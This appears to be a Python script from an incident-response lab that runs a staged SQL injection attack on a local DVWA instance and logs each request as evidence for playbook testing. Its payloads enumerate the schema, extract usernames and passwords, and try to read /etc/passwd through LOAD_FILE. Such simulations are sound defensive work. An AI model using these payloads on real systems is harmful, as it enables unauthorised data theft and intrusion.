#!/usr/bin/env python3
"""
SQL Injection Attack Simulation Script
Target: DVWA (Damn Vulnerable Web Application)
Purpose: Generate attack traffic for IR Playbook testing
"""

import requests
import time
import json
from datetime import datetime

# ===== CONFIGURATION =====
DVWA_URL = "http://localhost:8080"
DVWA_USER = "admin"
DVWA_PASS = "password"
LOG_FILE = "simulations/sqli/evidence/attack_log.json"

class SQLiSimulation:
    def __init__(self):
        self.session = requests.Session()
        self.attack_log = []
        self.start_time = None

    def login_dvwa(self):
        """Login to DVWA and get session"""
        # Get CSRF token
        resp = self.session.get(f"{DVWA_URL}/login.php")
        # Simple token extraction
        token = resp.text.split("user_token' value='")[1].split("'")[0]

        login_data = {
            "username": DVWA_USER,
            "password": DVWA_PASS,
            "Login": "Login",
            "user_token": token
        }
        self.session.post(f"{DVWA_URL}/login.php", data=login_data)

        # Set security to low
        self.session.get(f"{DVWA_URL}/security.php")
        self.session.post(f"{DVWA_URL}/security.php",
                         data={"security": "low", "sumbmit": "Submit"})
        print("[+] Logged into DVWA successfully")

    def log_attack(self, phase, payload, response_code, response_length, notes):
        """Log each attack step"""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "phase": phase,
            "payload": payload,
            "response_code": response_code,
            "response_length": response_length,
            "notes": notes
        }
        self.attack_log.append(entry)
        print(f"  [{phase}] Payload: {payload[:60]}... | Status: {response_code}")

    # ===== ATTACK PHASES =====

    def phase1_reconnaissance(self):
        """Phase 1: Xác định endpoint vulnerable"""
        print("\n[*] Phase 1: Reconnaissance")
        payloads = [
            "1",           # Normal request (baseline)
            "1'",          # Single quote test
            "1\"",         # Double quote test
            "1 OR 1=1",    # Basic boolean test
        ]
        for payload in payloads:
            resp = self.session.get(
                f"{DVWA_URL}/vulnerabilities/sqli/",
                params={"id": payload, "Submit": "Submit"}
            )
            self.log_attack("RECON", payload, resp.status_code,
                          len(resp.text),
                          "Error in response" if "error" in resp.text.lower() else "Normal")
            time.sleep(1)

    def phase2_exploitation(self):
        """Phase 2: Khai thác SQLi - Extract data"""
        print("\n[*] Phase 2: Exploitation - Data Extraction")
        payloads = [
            # Determine number of columns
            "1' ORDER BY 1#",
            "1' ORDER BY 2#",
            "1' ORDER BY 3#",  # This should error -> 2 columns

            # Extract database info
            "1' UNION SELECT database(), user()#",

            # Extract table names
            "1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()#",

            # Extract column names from users table
            "1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'#",

            # Extract usernames and passwords
            "1' UNION SELECT user, password FROM users#",
        ]
        for payload in payloads:
            resp = self.session.get(
                f"{DVWA_URL}/vulnerabilities/sqli/",
                params={"id": payload, "Submit": "Submit"}
            )
            self.log_attack("EXPLOIT", payload, resp.status_code,
                          len(resp.text),
                          f"Data extracted: {len(resp.text)} bytes")
            time.sleep(2)

    def phase3_post_exploitation(self):
        """Phase 3: Post-exploitation actions"""
        print("\n[*] Phase 3: Post-Exploitation")
        payloads = [
            # Try to read system files
            "1' UNION SELECT LOAD_FILE('/etc/passwd'), 2#",

            # Try to get MySQL version
            "1' UNION SELECT @@version, @@datadir#",
        ]
        for payload in payloads:
            resp = self.session.get(
                f"{DVWA_URL}/vulnerabilities/sqli/",
                params={"id": payload, "Submit": "Submit"}
            )
            self.log_attack("POST-EXPLOIT", payload, resp.status_code,
                          len(resp.text), "Post-exploitation attempt")
            time.sleep(2)

    def save_log(self):
        """Save attack log for evidence"""
        report = {
            "simulation": "SQL Injection Attack",
            "target": DVWA_URL,
            "start_time": self.start_time,
            "end_time": datetime.now().isoformat(),
            "total_requests": len(self.attack_log),
            "attacks": self.attack_log
        }
        with open(LOG_FILE, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\n[+] Attack log saved to {LOG_FILE}")

    def run(self):
        """Execute full simulation"""
        print("=" * 60)
        print("SQL INJECTION ATTACK SIMULATION")
        print("=" * 60)
        self.start_time = datetime.now().isoformat()

        self.login_dvwa()
        self.phase1_reconnaissance()
        self.phase2_exploitation()
        self.phase3_post_exploitation()
        self.save_log()

        print("\n" + "=" * 60)
        print(f"Simulation complete. {len(self.attack_log)} attack requests sent.")
        print("=" * 60)

if __name__ == "__main__":
    sim = SQLiSimulation()
    sim.run()
